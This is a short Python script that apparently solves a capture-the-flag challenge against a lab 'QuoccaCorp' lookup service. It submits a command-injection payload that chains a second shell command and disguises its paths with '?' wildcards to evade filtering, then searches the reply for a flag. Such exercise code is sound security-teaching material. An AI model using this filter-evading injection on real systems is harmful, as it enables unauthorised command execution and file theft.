import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

from bs4 import BeautifulSoup

BASE_URL = "https://lookup.quoccacorp.com"
PAYLOAD = ". && /???/??? /??????/????"

class Solver:
    def __init__(self):
        self.session = get_session()

    def get_results(self, response) -> list[str]:
        soup = BeautifulSoup(response.text, "html.parser")
        return soup.find("div", class_="alert-dark").find("pre").get_text(strip=True)

    def main(self):
        response = self.session.post(BASE_URL, data={"query": PAYLOAD})
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()